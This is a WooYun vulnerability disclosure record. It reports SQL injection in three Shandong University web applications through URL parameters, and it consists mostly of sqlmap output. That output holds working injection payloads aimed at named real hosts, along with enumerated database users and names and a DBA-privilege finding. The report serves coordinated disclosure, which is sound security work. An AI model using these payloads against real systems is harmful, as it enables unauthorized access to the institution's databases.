{"id": 76363, "wybug_id": "wooyun-2015-0165109", "wybug_title": "山东大学多站SQL注入", "wybug_corp": "山东大学", "wybug_author": "路人甲", "wybug_date": "2015-12-28 13:00", "wybug_open_date": "2016-02-09 23:29", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-12-28：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-12-29：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-01-08：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-01-18：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-01-28：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-02-09：\t细节向公众公开  简要描述： 山东大学多站SQL注入 详细说明：  1.注入点：http://www.hglx.sdu.edu.cn/article.php?id=764\nGET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] nsqlmap identified the following injection points with a total of 160 HTTP(s) requests:---Parameter: id (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=764 AND 5432=5432    Type: UNION query    Title: MySQL UNION query (NULL) - 37 columns    Payload: id=-4328 UNION ALL SELECT 16,16,16,16,16,16,16,16,CONCAT(0x7176706271,0x5744684c69474559504d,0x7178717a71),16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16#    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind (SELECT)    Payload: id=764 AND (SELECT * FROM (SELECT(SLEEP(100)))PgMm)---[09:20:24] [INFO] the back-end DBMS is MySQLweb server operating system: Windows 2008 or Vistaweb application technology: PHP 5.2.6, ASP.NET, Microsoft IIS 7.0back-end DBMS: MySQL 5.0.11\n\nweb server operating system: Windows 2008 or Vistaweb application technology: PHP 5.2.6, ASP.NET, Microsoft IIS 7.0back-end DBMS: MySQL 5.0.11[09:20:38] [INFO] fetching current usersqlmap got a 302 redirect to 'http://www.hglx.sdu.edu.cn:80/index.php'. Do you want to follow? [Y/n] ncurrent user:    'sq_hanguoliuxue@%'available databases [2]:                                                       [*] information_schema[*] sq_hanguoliuxue\n\n\n\n\n\nGET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] nsqlmap identified the following injection points with a total of 160 HTTP(s) requests:---Parameter: id (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=764 AND 5432=5432    Type: UNION query    Title: MySQL UNION query (NULL) - 37 columns    Payload: id=-4328 UNION ALL SELECT 16,16,16,16,16,16,16,16,CONCAT(0x7176706271,0x5744684c69474559504d,0x7178717a71),16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16#    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind (SELECT)    Payload: id=764 AND (SELECT * FROM (SELECT(SLEEP(100)))PgMm)---[09:20:24] [INFO] the back-end DBMS is MySQLweb server operating system: Windows 2008 or Vistaweb application technology: PHP 5.2.6, ASP.NET, Microsoft IIS 7.0back-end DBMS: MySQL 5.0.11\n\nweb server operating system: Windows 2008 or Vistaweb application technology: PHP 5.2.6, ASP.NET, Microsoft IIS 7.0back-end DBMS: MySQL 5.0.11[09:20:38] [INFO] fetching current usersqlmap got a 302 redirect to 'http://www.hglx.sdu.edu.cn:80/index.php'. Do you want to follow? [Y/n] ncurrent user:    'sq_hanguoliuxue@%'available databases [2]:                                                       [*] information_schema[*] sq_hanguoliuxue\n\n\n\n\n   漏洞证明：  2.注入点：http://yinshi.wh.sdu.edu.cn/show.php?filed_id=72yinshi.wh.sdu.edu.cn/show.php?filed_id=-72 UNION SELECT ALL 1,2,3,4,5,6,7,8,9\nGET parameter 'filed_id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] nsqlmap identified the following injection points with a total of 69 HTTP(s) requests:---Parameter: filed_id (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: filed_id=72 AND 3076=3076    Type: UNION query    Title: Generic UNION query (NULL) - 9 columns    Payload: filed_id=-7442 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x716a707171,0x68597a6370495452576c,0x7170717171),NULL,NULL,NULL--     Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind (SELECT)    Payload: filed_id=72 AND (SELECT * FROM (SELECT(SLEEP(100)))pDsO)---[09:13:30] [INFO] the back-end DBMS is MySQLweb server operating system: Linux CentOS 5.10web application technology: Apache 2.2.3, PHP 5.2.17back-end DBMS: MySQL 5.0.11\n\nweb server operating system: Linux CentOS 5.10web application technology: Apache 2.2.3, PHP 5.2.17back-end DBMS: MySQL 5.0.11[09:13:49] [INFO] fetching current usercurrent user:    'yinshi@localhost'web server operating system: Linux CentOS 5.10web application technology: Apache 2.2.3, PHP 5.2.17back-end DBMS: MySQL 5.0.11[09:14:01] [INFO] fetching database names[09:14:03] [INFO] the SQL query used returns 3 entries[09:14:04] [INFO] retrieved: information_schema[09:14:05] [INFO] retrieved: test[09:14:06] [INFO] retrieved: yinshiavailable databases [3]:                                                       [*] information_schema[*] test[*] yinshi\n\n\n\n\n\n\n3.注入点：http://sv13.wljy.sdu.edu.cn:1500/listArticle.aspx?ColumnId=1&PageNo=1\nURI parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] nsqlmap identified the following injection points with a total of 36 HTTP(s) requests:---Parameter: #1* (URI)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: http://sv13.wljy.sdu.edu.cn:1500/listArticle.aspx?ColumnId=1' AND 8948=8948 AND 'tLIT'='tLIT&PageNo=1    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: http://sv13.wljy.sdu.edu.cn:1500/listArticle.aspx?ColumnId=1' AND 3405=CONVERT(INT,(SELECT CHAR(113)+CHAR(98)+CHAR(98)+CHAR(112)+CHAR(113)+(SELECT (CASE WHEN (3405=3405) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(113)+CHAR(120)+CHAR(113)+CHAR(113))) AND 'KbrS'='KbrS&PageNo=1---[02:45:37] [INFO] testing Microsoft SQL Server[02:45:42] [INFO] confirming Microsoft SQL Server[02:46:04] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2003 or XPweb application technology: ASP.NET, ASP.NET 4.0.30319, Microsoft IIS 6.0back-end DBMS: Microsoft SQL Server 2005\n\navailable databases [1]:[*] EntrolExam\ndba权限\nweb server operating system: Windows 2003 or XPweb application technology: ASP.NET, ASP.NET 4.0.30319, Microsoft IIS 6.0back-end DBMS: Microsoft SQL Server 2005[02:57:21] [INFO] testing if current user is DBAcurrent user is DBA:    True\n\n\n\n\n   修复方案：     版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：6  确认时间：2015-12-29 09:44 厂商回复： 已通报系统所属单位 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 6, "Ranks": null}